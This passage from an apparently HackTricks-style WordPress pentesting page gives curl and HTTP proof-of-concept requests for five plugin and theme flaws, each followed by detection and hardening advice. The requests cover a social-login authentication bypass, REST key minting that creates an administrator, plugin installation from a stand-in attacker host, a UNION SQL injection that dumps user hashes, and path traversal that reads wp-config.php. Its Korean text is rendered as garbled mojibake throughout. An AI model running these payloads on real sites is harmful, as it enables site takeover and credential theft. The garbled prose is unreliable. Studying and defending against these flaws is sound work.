- providerë¥¼ ì§€ì›ë˜ì§€ ì•ŠëŠ” ê°’ìœ¼ë¡œ ì„¤ì •(ë˜ëŠ” ìƒëµ)í•˜ì—¬ default branchë¥¼ íƒ€ê²Œ í•œ ë’¤ id=<victim_email>ë¥¼ ì „ë‹¬.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- í´ë¼ì´ì–¸íŠ¸ ì…ë ¥ìœ¼ë¡œë¶€í„° ì‹ ì›ì„ ìœ ì¶”í•˜ì§€ ë§ˆì„¸ìš”. ê²€ì¦ëœ provider í† í°/IDì—ì„œ ìœ ë˜í•œ ì´ë©”ì¼/IDë§Œ í—ˆìš©í•˜ì‹­ì‹œì˜¤.
- ë¡œê·¸ì¸ í—¬í¼ì—ë„ CSRF nonces ë° capability checksë¥¼ ìš”êµ¬í•˜ì„¸ìš”; ë¶ˆí•„ìš”í•œ ê²½ìš° wp_ajax_nopriv_ ë“±ë¡ì„ í”¼í•˜ì‹­ì‹œì˜¤.
- OAuth/OIDC ì‘ë‹µì„ ì„œë²„ ì¸¡ì—ì„œ ê²€ì¦í•˜ê³  í™•ì¸í•˜ì„¸ìš”; ëˆ„ë½ë˜ì—ˆê±°ë‚˜ ìœ íš¨í•˜ì§€ ì•Šì€ ê³µê¸‰ì(provider)ëŠ” ê±°ë¶€í•˜ì‹­ì‹œì˜¤(POST idë¡œì˜ í´ë°± ê¸ˆì§€).
- ìˆ˜ì •ë  ë•Œê¹Œì§€ ì†Œì…œ ë¡œê·¸ì¸ì„ ì¼ì‹œì ìœ¼ë¡œ ë¹„í™œì„±í™”í•˜ê±°ë‚˜ ì—£ì§€ì—ì„œ ì·¨ì•½í•œ ì•¡ì…˜ì„ ì°¨ë‹¨í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ê°€ìƒ íŒ¨ì¹˜ë¥¼ ê³ ë ¤í•˜ì„¸ìš”.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ í˜¸ì¶œìì˜ ê¶Œí•œì„ ê²€ì¦í•˜ì§€ ì•Šê³  ì¬ì‚¬ìš© ê°€ëŠ¥í•œ â€œconnection keysâ€ ë˜ëŠ” í† í°ì„ ë°œê¸‰í•˜ëŠ” REST ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤. ê²½ë¡œê°€ ì¶”ì¸¡ ê°€ëŠ¥í•œ ì†ì„±(ì˜ˆ: username)ë§Œìœ¼ë¡œ ì¸ì¦í•˜ê³  í‚¤ë¥¼ ì‚¬ìš©ì/ì„¸ì…˜ì— capability checksë¡œ ë°”ì¸ë”©í•˜ì§€ ì•Šìœ¼ë©´, ëª¨ë“  ë¯¸ì¸ì¦ ê³µê²©ìê°€ í‚¤ë¥¼ ë°œê¸‰(mint)í•˜ì—¬ ê¶Œí•œ ìˆëŠ” ë™ì‘(ê´€ë¦¬ì ê³„ì • ìƒì„±, í”ŒëŸ¬ê·¸ì¸ ì•¡ì…˜ â†’ RCE)ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why itâ€™s exploitable
- ë¯¼ê°í•œ REST routeê°€ ë‚®ì€ ì—”íŠ¸ë¡œí”¼ì˜ ì‹ ì› ì¦ëª…(username)ìœ¼ë¡œë§Œ ë³´í˜¸ë˜ê±°ë‚˜ permission_callbackì´ ëˆ„ë½ë¨
- capability ê²€ì‚¬ê°€ ì—†ìŒ; ë°œê¸‰ëœ keyê°€ ë²”ìš© ìš°íšŒë¡œë¡œ ìˆ˜ìš©ë¨

Detection checklist
- register_rest_route(..., [ 'permission_callback' => '__return_true' ]) ë¥¼ ì°¾ê¸° ìœ„í•´ í”ŒëŸ¬ê·¸ì¸ ì½”ë“œë¥¼ grep
- ìš”ì²­ìœ¼ë¡œ ì œê³µëœ ì‹ ì›(username/email)ì„ ê¸°ë°˜ìœ¼ë¡œ í† í°/í‚¤ë¥¼ ë°œê¸‰í•˜ë˜ ì´ë¥¼ ì¸ì¦ëœ ì‚¬ìš©ìë‚˜ capabilityì™€ ì—°ê²°í•˜ì§€ ì•ŠëŠ” ëª¨ë“  route
- ì„œë²„ ì¸¡ capability ê²€ì‚¬ ì—†ì´ ë°œê¸‰ëœ token/keyë¥¼ ìˆ˜ìš©í•˜ëŠ” í›„ì† routeë¥¼ ì°¾ì•„ë¼

Hardening
- ê¶Œí•œì´ í•„ìš”í•œ ëª¨ë“  REST routeì— ëŒ€í•´: í•„ìš”í•œ capabilityì— ëŒ€í•´ current_user_can()ì„ ì ìš©í•˜ëŠ” permission_callback ìš”êµ¬
- í´ë¼ì´ì–¸íŠ¸ê°€ ì œê³µí•œ ì‹ ì›ìœ¼ë¡œ ì¥ê¸° ìœ íš¨ í‚¤ë¥¼ ë°œê¸‰í•˜ì§€ ë§ˆë¼; í•„ìš”í•œ ê²½ìš° ì¸ì¦ í›„ ë‹¨ëª…, ì‚¬ìš©ì ë°”ì¸ë”©ëœ í† í°ì„ ë°œê¸‰í•˜ê³  ì‚¬ìš© ì‹œ capabilityë¥¼ ë‹¤ì‹œ í™•ì¸í•˜ë¼
- í˜¸ì¶œìì˜ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ê²€ì¦í•˜ë¼ (wp_set_current_userë§Œìœ¼ë¡œëŠ” ì¶©ë¶„í•˜ì§€ ì•ŠìŒ) ê·¸ë¦¬ê³  !is_user_logged_in() || !current_user_can(<cap>) ì¸ ìš”ì²­ì€ ê±°ë¶€í•˜ë¼

---

## Nonce gate misuse â†’ unauthenticated arbitrary plugin installation (FunnelKit Automations â‰¤ 3.5.3)

NoncesëŠ” CSRFë¥¼ ë°©ì§€í•˜ì§€ë§Œ ê¶Œí•œ ë¶€ì—¬ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠëŠ”ë‹¤. ì½”ë“œê°€ nonce í†µê³¼ë¥¼ ì¼ì¢…ì˜ í—ˆê°€ ì‹ í˜¸ë¡œ ê°„ì£¼í•˜ê³  ê¶Œí•œì´ í•„ìš”í•œ ì‘ì—…(ì˜ˆ: install/activate plugins)ì— ëŒ€í•œ capability ê²€ì‚¬ë¥¼ ê±´ë„ˆë›°ë©´, ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìëŠ” ì•½í•œ nonce ìš”êµ¬ë¥¼ ì¶©ì¡±ì‹œì¼œ ë°±ë„ì–´ê°€ ì‹¬ê¸´ ë˜ëŠ” ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•¨ìœ¼ë¡œì¨ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆë‹¤.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

í•˜ë“œë‹
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## depicter-* ì•¡ì…˜ì˜ s (search) íŒŒë¼ë¯¸í„°ë¥¼ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ SQLi (Depicter Slider â‰¤ 3.6.1)

ì—¬ëŸ¬ depicter-* ì•¡ì…˜ì´ s (search) íŒŒë¼ë¯¸í„°ë¥¼ ì‚¬ìš©í•´ ì´ë¥¼ íŒŒë¼ë¯¸í„°í™” ì—†ì´ SQL ì¿¼ë¦¬ì— ì—°ê²°í–ˆë‹¤.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- grepìœ¼ë¡œ depicter-* action í•¸ë“¤ëŸ¬ì™€ SQLì—ì„œ $_GET['s'] ë˜ëŠ” $_POST['s']ì˜ ì§ì ‘ ì‚¬ìš©ì„ ì°¾ì•„ë³´ì„¸ìš”
- $wpdb->get_results()/query()ë¡œ ì „ë‹¬ë˜ëŠ” ì»¤ìŠ¤í…€ ì¿¼ë¦¬ì—ì„œ së¥¼ ì—°ê²°(concatenating)í•˜ëŠ” ë¶€ë¶„ì„ ê²€í† í•˜ì„¸ìš”

ë³´ì•ˆ ê°•í™”
- í•­ìƒ $wpdb->prepare()ë‚˜ wpdb í”Œë ˆì´ìŠ¤í™€ë”ë¥¼ ì‚¬ìš©í•˜ê³ ; ì˜ˆìƒì¹˜ ëª»í•œ ë©”íƒ€ë¬¸ìëŠ” ì„œë²„ ì¸¡ì—ì„œ ì°¨ë‹¨í•˜ì„¸ìš”
- sì— ëŒ€í•´ ì—„ê²©í•œ í—ˆìš© ëª©ë¡ì„ ì¶”ê°€í•˜ê³  ì˜ˆìƒëœ ë¬¸ìì…‹/ê¸¸ì´ë¡œ ì •ê·œí™”í•˜ì„¸ìš”

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

í…œí”Œë¦¿ íŒŒë¼ë¯¸í„°ì—ì„œ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ê²½ë¡œë¥¼ ì •ê·œí™”/ì œí•œ ì—†ì´ ìˆ˜ë½í•˜ë©´ ì„ì˜ì˜ ë¡œì»¬ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆê³ , includable PHP/log íŒŒì¼ì´ ëŸ°íƒ€ì„ì— í¬í•¨ë˜ë©´ ê²½ìš°ì— ë”°ë¼ ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: ì •ê·œí™”/í—ˆìš© ëª©ë¡ ì—†ìŒ; ë””ë ‰í„°ë¦¬ íŠ¸ë˜ë²„ì„¤ í—ˆìš©
- Impact: ê¸°ë°€ ë…¸ì¶œ (wp-config.php), íŠ¹ì • í™˜ê²½ì—ì„œëŠ” ì ì¬ì  RCE (ë¡œê·¸ í¬ì´ì¦ˆë‹, includable PHP)

PoC â€“ wp-config.php ì½ê¸°
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸
- ìš”ì²­ ê²½ë¡œë¥¼ realpath() containment ì—†ì´ include()/require()/read sinkì— ì´ì–´ë¶™ì´ëŠ” í•¸ë“¤ëŸ¬ê°€ ìˆëŠ”ì§€ í™•ì¸
- ì˜ë„ëœ templates ë””ë ‰í„°ë¦¬ ë°–ìœ¼ë¡œ ë²—ì–´ë‚˜ëŠ” traversal íŒ¨í„´ (../)ì„ í™•ì¸

í•˜ë“œë‹
- Allowlisted í…œí”Œë¦¿ì„ ê°•ì œí•¨; realpath()ë¡œ í•´ì„í•˜ê³  require str_starts_with(realpath(file), realpath(allowed_base))
- ì…ë ¥ì„ ì •ê·œí™”í•¨; traversal ì‹œí€€ìŠ¤ì™€ ì ˆëŒ€ ê²½ë¡œë¥¼ ê±°ë¶€í•¨; sanitize_file_name()ì€ íŒŒì¼ëª…(ì „ì²´ ê²½ë¡œê°€ ì•„ë‹˜)ì—ë§Œ ì‚¬ìš©


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
